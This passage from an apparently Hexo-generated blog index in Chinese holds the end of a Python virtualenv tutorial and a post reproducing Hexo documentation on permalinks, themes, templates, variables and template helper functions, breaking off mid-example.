class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip list</span><br><span class="line">pip show 安装包名称 </span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/18.png"></p><h2 id="八：删除虚拟环境"><a href="#八：删除虚拟环境" class="headerlink" title="八：删除虚拟环境"></a>八：删除虚拟环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmvirtualenv 虚拟环境名称 </span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/19.png"></p><h1 id="查看Python以及安装包库的安装路径"><a href="#查看Python以及安装包库的安装路径" class="headerlink" title="查看Python以及安装包库的安装路径"></a>查看Python以及安装包库的安装路径</h1><p>当我们需要查看Python 安装位置或者第三方的位置的时候，记不清原来安装的位置，可以使用下面的命令来查看 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 进入python            </span><br><span class="line"> import sys             </span><br><span class="line"> sys.path </span><br></pre></td></tr></table></figure><p>则会打印出你当前版本安装包的位置        </p><p>例如                </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys                 </span><br><span class="line">module &#x3D; sys.path                 </span><br><span class="line">for i in module:                         </span><br><span class="line">    print(i) </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 虚拟环境 </tag>
            
            <tag> virtualenv </tag>
            
            <tag> virtualenvwrapper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo自定义</title>
      <link href="/2018/05/09/hexo%E8%87%AA%E5%AE%9A%E4%B9%89/"/>
      <url>/2018/05/09/hexo%E8%87%AA%E5%AE%9A%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h1 id="永久链接（Permalinks）"><a href="#永久链接（Permalinks）" class="headerlink" title="永久链接（Permalinks）"></a>永久链接（Permalinks）</h1><p>您可以在 <code>_config.yml</code> 配置中调整网站的永久链接或者在每篇文章的 Front-matter 中指定。 </p><a id="more"></a><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>除了下列变量外，您还可使用 Front-matter 中的所有属性。</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>:year</code></td><td>文章的发表年份（4 位数）</td></tr><tr><td><code>:month</code></td><td>文章的发表月份（2 位数）</td></tr><tr><td><code>:i_month</code></td><td>文章的发表月份（去掉开头的零）</td></tr><tr><td><code>:day</code></td><td>文章的发表日期 (2 位数)</td></tr><tr><td><code>:i_day</code></td><td>文章的发表日期（去掉开头的零）</td></tr><tr><td><code>:title</code></td><td>文件名称</td></tr><tr><td><code>:post_title</code></td><td>文章标题</td></tr><tr><td><code>:id</code></td><td>文章 ID</td></tr><tr><td><code>:category</code></td><td>分类。如果文章没有分类，则是 <code>default_category</code> 配置信息。</td></tr></tbody></table><p>您可在 <code>permalink_defaults</code> 参数下调整永久链接中各变量的默认值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">permalink_defaults:</span><br><span class="line">  lang: en</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设 <code>source/_posts</code> 文件夹中有个 <code>hello-world.md</code>，包含以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">title: Hello World</span><br><span class="line">date: 2013-07-14 17:01:34</span><br><span class="line">categories:</span><br><span class="line">- foo</span><br><span class="line">- bar</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>结果</th></tr></thead><tbody><tr><td><code>:year/:month/:day/:title/</code></td><td>2013/07/14/hello-world</td></tr><tr><td><code>:year-:month-:day-:title.html</code></td><td>2013-07-14-hello-world.html</td></tr><tr><td><code>:category/:title</code></td><td>foo/bar/hello-world</td></tr></tbody></table><h3 id="多语种支持"><a href="#多语种支持" class="headerlink" title="多语种支持"></a>多语种支持</h3><p>若要建立一个多语种的网站，您可修改 <code>new_post_name</code> 和 <code>permalink</code> 参数，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_post_name: :lang&#x2F;:title.md</span><br><span class="line">permalink: :lang&#x2F;:title&#x2F;</span><br></pre></td></tr></table></figure><p>当您建立新文章时，文章会被储存到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new &quot;Hello World&quot; --lang tw</span><br><span class="line"># &#x3D;&gt; source&#x2F;_posts&#x2F;tw&#x2F;Hello-World.md</span><br></pre></td></tr></table></figure><p>而网址会是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:4000&#x2F;tw&#x2F;hello-world&#x2F;</span><br></pre></td></tr></table></figure><h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><p>创建 Hexo 主题非常容易，您只要在 <code>themes</code> 文件夹内，新增一个任意名称的文件夹，并修改 <code>_config.yml</code> 内的 <code>theme</code> 设定，即可切换主题。一个主题可能会有以下的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── languages</span><br><span class="line">├── layout</span><br><span class="line">├── scripts</span><br><span class="line">└── source</span><br></pre></td></tr></table></figure><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>主题的配置文件。修改时会自动更新，无需重启服务器。</p><h3 id="layout"><a href="#layout" class="headerlink" title="layout"></a>layout</h3><p>布局文件夹。用于存放主题的模板文件，决定了网站内容的呈现方式，Hexo 内建 <a href="http://paularmstrong.github.com/swig/">Swig</a> 模板引擎，您可以另外安装插件来获得 <a href="https://github.com/hexojs/hexo-renderer-ejs">EJS</a>、<a href="https://github.com/hexojs/hexo-renderer-haml">Haml</a> 或 <a href="https://github.com/hexojs/hexo-renderer-jade">Jade</a> 支持，Hexo 根据模板文件的扩展名来决定所使用的模板引擎，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">layout.ejs   - 使用 EJS</span><br><span class="line">layout.swig  - 使用 Swig</span><br></pre></td></tr></table></figure><p>您可参考 <a href="https://hexo.io/zh-cn/docs/templates.html">模板</a> 以获得更多信息。</p><h3 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h3><p>脚本文件夹。在启动时，Hexo 会载入此文件夹内的 JavaScript 文件，请参见 <a href="https://hexo.io/zh-cn/docs/plugins.html">插件</a> 以获得更多信息。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹，除了模板以外的 Asset，例如 CSS、JavaScript 文件等，都应该放在这个文件夹中。文件或文件夹开头名称为 <code>_</code>（下划线线）或隐藏的文件会被忽略。</p><p>如果文件可以被渲染的话，会经过解析然后储存到 <code>public</code> 文件夹，否则会直接拷贝到 <code>public</code> 文件夹。</p><h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>当您完成主题后，可以考虑将它发布到 <a href="https://hexo.io/themes">主题列表</a>，让更多人能够使用您的主题。在发布前建议先进行 <a href="https://github.com/hexojs/hexo-theme-unit-test">主题单元测试</a>，确保每一项功能都能正常使用。发布主题的步骤和 <a href="https://hexo.io/zh-cn/docs/contributing.html#%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3">更新文档</a> 非常类似。</p><ol><li><p>Fork <a href="https://github.com/hexojs/site">hexojs/site</a></p></li><li><p>把库（repository）复制到电脑上，并安装所依赖的插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;&lt;username&gt;&#x2F;site.git</span><br><span class="line">$ cd site</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure></li><li><p>编辑 <code>source/_data/themes.yml</code>，在文件中新增您的主题，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- name: landscape</span><br><span class="line">  description: A brand new default theme for Hexo.</span><br><span class="line">  link: https:&#x2F;&#x2F;github.com&#x2F;hexojs&#x2F;hexo-theme-landscape</span><br><span class="line">  preview: http:&#x2F;&#x2F;hexo.io&#x2F;hexo-theme-landscape</span><br><span class="line">  tags:</span><br><span class="line">    - official</span><br><span class="line">    - responsive</span><br><span class="line">    - widget</span><br><span class="line">    - two_column</span><br><span class="line">    - one_column</span><br></pre></td></tr></table></figure></li><li><p>在 <code>source/themes/screenshots</code> 新增同名的截图档案，图片必须为 800x500 的 PNG 文件。</p></li><li><p>推送（push）分支。</p></li><li><p>建立一个新的合并申请（pull request）并描述改动。</p></li></ol><h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p>模板决定了网站内容的呈现方式，每个主题至少都应包含一个 <code>index</code> 模板，以下是各页面相对应的模板名称：</p><table><thead><tr><th>模板</th><th>用途</th><th>回调</th></tr></thead><tbody><tr><td><code>index</code></td><td>首页</td><td></td></tr><tr><td><code>post</code></td><td>文章</td><td><code>index</code></td></tr><tr><td><code>page</code></td><td>分页</td><td><code>index</code></td></tr><tr><td><code>archive</code></td><td>归档</td><td><code>index</code></td></tr><tr><td><code>category</code></td><td>分类归档</td><td><code>archive</code></td></tr><tr><td><code>tag</code></td><td>标签归档</td><td><code>archive</code></td></tr></tbody></table><h2 id="布局（Layout）"><a href="#布局（Layout）" class="headerlink" title="布局（Layout）"></a>布局（Layout）</h2><p>如果页面结构类似，例如两个模板都有页首（Header）和页脚（Footer），您可考虑通过「布局」让两个模板共享相同的结构。一个布局文件必须要能显示 <code>body</code> 变量的内容，如此一来模板的内容才会被显示，举例来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.ejsindex</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">layout.ejs&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;&lt;%- body %&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>生成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;index&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>每个模板都默认使用 <code>layout</code> 布局，您可在 front-matter 指定其他布局，或是设为 <code>false</code> 来关闭布局功能，您甚至可在布局中再使用其他布局来建立嵌套布局。</p><h2 id="局部模版（Partial）"><a href="#局部模版（Partial）" class="headerlink" title="局部模版（Partial）"></a>局部模版（Partial）</h2><p>局部模板让您在不同模板之间共享相同的组件，例如页首（Header）、页脚（Footer）或侧边栏（Sidebar）等，可利用局部模板功能分割为个别文件，让维护更加便利。举例来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">partial&#x2F;header.ejs&lt;h1 id&#x3D;&quot;logo&quot;&gt;&lt;%&#x3D; config.title %&gt;&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.ejs&lt;%- partial(&#39;partial&#x2F;header&#39;) %&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;content&quot;&gt;Home page&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>生成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 id&#x3D;&quot;logo&quot;&gt;My Site&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;content&quot;&gt;Home page&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>您可以在局部模板中指定局部变量并使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">partial&#x2F;header.ejs&lt;h1 id&#x3D;&quot;logo&quot;&gt;&lt;%&#x3D; title&gt;&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.ejs&lt;%- partial(&#39;partial&#x2F;header&#39;, &#123;title: &#39;Hello World&#39;&#125;) %&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;content&quot;&gt;Home page&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>生成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 id&#x3D;&quot;logo&quot;&gt;Hello World&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;content&quot;&gt;Home page&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>如果您的主题太过于复杂，或是需要生成的文件量太过于庞大，可能会大幅降低性能，除了简化主题外，您可以考虑 Hexo 2.7 新增的局部缓存（Fragment Caching） 功能。</p><p>本功能借鉴于 <a href="http://guides.rubyonrails.org/caching_with_rails.html#fragment-caching">Ruby on Rails</a>，它储存局部内容，下次便能直接使用缓存内容，可以减少文件夹查询并使生成速度更快。</p><p>它可用于页首、页脚、侧边栏等文件不常变动的位置，举例来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- fragment_cache(&#39;header&#39;, function()&#123;</span><br><span class="line">  return &#39;&lt;header&gt;&lt;&#x2F;header&gt;&#39;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果您使用局部模板的话，可以更简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(&#39;header&#39;, &#123;&#125;, &#123;cache: true&#125;);</span><br></pre></td></tr></table></figure><p>但是，如果您开启了 <code>relative_link</code> 参数的话，请勿使用局部缓存功能，因为相对链接在每个页面可能不同。</p><h1 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h1><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>site</code></td><td><a href="https://hexo.io/zh-cn/docs/variables.html#%E7%BD%91%E7%AB%99%E5%8F%98%E9%87%8F">网站变量</a></td></tr><tr><td><code>page</code></td><td>针对该页面的内容以及 front-matter 所设定的变量。</td></tr><tr><td><code>config</code></td><td>网站配置</td></tr><tr><td><code>theme</code></td><td>主题配置。继承自网站配置。</td></tr><tr><td><code>_</code> (单下划线)</td><td><a href="http://lodash.com/">Lodash</a> 函数库</td></tr><tr><td><code>path</code></td><td>当前页面的路径（不含根路径）</td></tr><tr><td><code>url</code></td><td>当前页面的完整网址</td></tr><tr><td><code>env</code></td><td>环境变量</td></tr></tbody></table><h3 id="网站变量"><a href="#网站变量" class="headerlink" title="网站变量"></a>网站变量</h3><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>site.posts</code></td><td>所有文章</td></tr><tr><td><code>site.pages</code></td><td>所有分页</td></tr><tr><td><code>site.categories</code></td><td>所有分类</td></tr><tr><td><code>site.tags</code></td><td>所有标签</td></tr></tbody></table><h3 id="页面变量"><a href="#页面变量" class="headerlink" title="页面变量"></a>页面变量</h3><p><strong>页面（page）</strong></p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>page.title</code></td><td>页面标题</td></tr><tr><td><code>page.date</code></td><td>页面建立日期（<a href="http://momentjs.com/">Moment.js</a> 对象）</td></tr><tr><td><code>page.updated</code></td><td>页面更新日期（<a href="http://momentjs.com/">Moment.js</a> 对象）</td></tr><tr><td><code>page.comments</code></td><td>留言是否开启</td></tr><tr><td><code>page.layout</code></td><td>布局名称</td></tr><tr><td><code>page.content</code></td><td>页面的完整内容</td></tr><tr><td><code>page.excerpt</code></td><td>页面摘要</td></tr><tr><td><code>page.more</code></td><td>除了页面摘要的其余内容</td></tr><tr><td><code>page.source</code></td><td>页面原始路径</td></tr><tr><td><code>page.full_source</code></td><td>页面的完整原始路径</td></tr><tr><td><code>page.path</code></td><td>页面网址（不含根路径）。我们通常在主题中使用 <code>url_for(page.path)</code>。</td></tr><tr><td><code>page.permalink</code></td><td>页面的完整网址</td></tr><tr><td><code>page.prev</code></td><td>上一个页面。如果此为第一个页面则为 <code>null</code>。</td></tr><tr><td><code>page.next</code></td><td>下一个页面。如果此为最后一个页面则为 <code>null</code>。</td></tr><tr><td><code>page.raw</code></td><td>文章的原始内容</td></tr><tr><td><code>page.photos</code></td><td>文章的照片（用于相簿）</td></tr><tr><td><code>page.link</code></td><td>文章的外部链接（用于链接文章）</td></tr></tbody></table><p><strong>文章 (post):</strong> 和 <code>page</code> 布局类似，但是添加了下列变量。</p><table><thead><tr><th>Variable</th><th>Description</th></tr></thead><tbody><tr><td><code>page.published</code></td><td>如果该文章已发布则为True</td></tr><tr><td><code>page.categories</code></td><td>该文章的所有分类</td></tr><tr><td><code>page.tags</code></td><td>该文章的所有标签</td></tr></tbody></table><p><strong>首页（index）</strong></p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>page.per_page</code></td><td>每页显示的文章数量</td></tr><tr><td><code>page.total</code></td><td>总文章数</td></tr><tr><td><code>page.current</code></td><td>目前页数</td></tr><tr><td><code>page.current_url</code></td><td>目前分页的网址</td></tr><tr><td><code>page.posts</code></td><td>本页文章</td></tr><tr><td><code>page.prev</code></td><td>上一页的页数。如果此页是第一页的话则为 <code>0</code>。</td></tr><tr><td><code>page.prev_link</code></td><td>上一页的网址。如果此页是第一页的话则为 <code>&#39;&#39;</code>。</td></tr><tr><td><code>page.next</code></td><td>下一页的页数。如果此页是最后一页的话则为 <code>0</code>。</td></tr><tr><td><code>page.next_link</code></td><td>下一页的网址。如果此页是最后一页的话则为 <code>&#39;&#39;</code>。</td></tr><tr><td><code>page.path</code></td><td>当前页面的路径（不含根目录）。我们通常在主题中使用 <code>url_for(page.path)</code>。</td></tr></tbody></table><p>**归档 (archive)**：与 <code>index</code> 布局相同，但新增以下变量。</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>page.archive</code></td><td>等于 <code>true</code></td></tr><tr><td><code>page.year</code></td><td>年份归档 (4位)</td></tr><tr><td><code>page.month</code></td><td>月份归档 (没有前导零的2位数)</td></tr></tbody></table><p>**分类 (category)**：与 <code>index</code> 布局相同，但新增以下变量。</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>page.category</code></td><td>分类名称</td></tr></tbody></table><p>**标签 (tag)**：与 <code>index</code> 布局相同，但新增以下变量。</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>page.tag</code></td><td>标签名称</td></tr></tbody></table><h1 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a>辅助函数</h1><p>辅助函数帮助您在模版中快速插入内容。辅助函数不能在源文件中使用。</p><h2 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h2><h3 id="url-for"><a href="#url-for" class="headerlink" title="url_for"></a>url_for</h3><p>在路径前加上根路径，从 Hexo 2.7 开始您应该使用此函数而不是 <code>config.root + path</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- url_for(path) %&gt;</span><br></pre></td></tr></table></figure><h3 id="relative-url"><a href="#relative-url" class="headerlink" title="relative_url"></a>relative_url</h3><p>取得与 <code>from</code> 相对的 <code>to</code> 路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- relative_url(from, to) %&gt;</span><br></pre></td></tr></table></figure><h3 id="gravatar"><a href="#gravatar" class="headerlink" title="gravatar"></a>gravatar</h3><p>插入 Gravatar 图片。<br>如果你不指定 <code>options</code> 参数，将会应用默认参数。否则，你可以将其设置为一个数字，这个数字将会作为 Gravatar 的大小参数。最后，如果你设置它一个对象，它将会被转换为 Gravatar 的一个查询字符串参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- gravatar(email, [options]);</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- gravatar(&#39;a@abc.com&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;www.gravatar.com&#x2F;avatar&#x2F;b9b00e66c6b8a70f88c73cb6bdb06787</span><br><span class="line"></span><br><span class="line">&lt;%- gravatar(&#39;a@abc.com&#39;, 40) %&gt;</span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;www.gravatar.com&#x2F;avatar&#x2F;b9b00e66c6b8a70f88c73cb6bdb06787?s&#x3D;40</span><br><span class="line"></span><br><span class="line">&lt;%- gravatar(&#39;a@abc.com&#39; &#123;s: 40, d: &#39;http:&#x2F;&#x2F;example.com&#x2F;image.png&#39;&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;www.gravatar.com&#x2F;avatar&#x2F;b9b00e66c6b8a70f88c73cb6bdb06787?s&#x3D;40&amp;d&#x3D;http%3A%2F%2Fexample.com%2Fimage.png</span><br></pre></td></tr></table></figure><h2 id="HTML-标签"><a href="#HTML-标签" class="headerlink" title="HTML 标签"></a>HTML 标签</h2><h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><p>载入 CSS 文件。<code>path</code> 可以是数组或字符串，如果 <code>path</code> 开头不是 <code>/</code> 或任何协议，则会自动加上根路径；如果后面没有加上 <code>.css</code> 扩展名的话，也会自动加上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- css(path, ...) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- css(&#39;style.css&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;style.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;%- css([&#39;style.css&#39;, &#39;screen.css&#39;]) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;style.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;screen.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>载入 JavaScript 文件。<code>path</code> 可以是数组或字符串，如果 <code>path</code> 开头不是 <code>/</code> 或任何协议，则会自动加上根路径；如果后面没有加上 <code>.js</code> 扩展名的话，也会自动加上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- js(path, ...) %&gt;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- js(&#39;script.js&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;%- js([&#39;script.js&#39;, &#39;gallery.js&#39;]) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;gallery.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="link-to"><a href="#link-to" class="headerlink" title="link_to"></a>link_to</h3><p>插入链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- link_to(path, [text], [options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>external</code></td><td>在新视窗打开链接</td><td>false</td></tr><tr><td><code>class</code></td><td>Class 名称</td><td></td></tr><tr><td><code>id</code></td><td>ID</td><td></td></tr></tbody></table><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- link_to(&#39;http:&#x2F;&#x2F;www.google.com&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.google.com&quot; title&#x3D;&quot;http:&#x2F;&#x2F;www.google.com&quot;&gt;http:&#x2F;&#x2F;www.google.com&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;%- link_to(&#39;http:&#x2F;&#x2F;www.google.com&#39;, &#39;Google&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.google.com&quot; title&#x3D;&quot;Google&quot;&gt;Google&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;%- link_to(&#39;http:&#x2F;&#x2F;www.google.com&#39;, &#39;Google&#39;, &#123;external: true&#125;) %&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.google.com&quot; title&#x3D;&quot;Google&quot; target&#x3D;&quot;_blank&quot; rel&#x3D;&quot;external&quot;&gt;Google&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h3 id="mail-to"><a href="#mail-to" class="headerlink" title="mail_to"></a>mail_to</h3><p>插入电子邮箱链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- mail_to(path, [text], [options]) %&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>class</code></td><td>Class 名称</td></tr><tr><td><code>id</code></td><td>ID</td></tr><tr><td><code>subject</code></td><td>邮件主题</td></tr><tr><td><code>cc</code></td><td>抄送（CC）</td></tr><tr><td><code>bcc</code></td><td>密送（BCC）</td></tr><tr><td><code>body</code></td><td>邮件内容</td></tr></tbody></table><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- 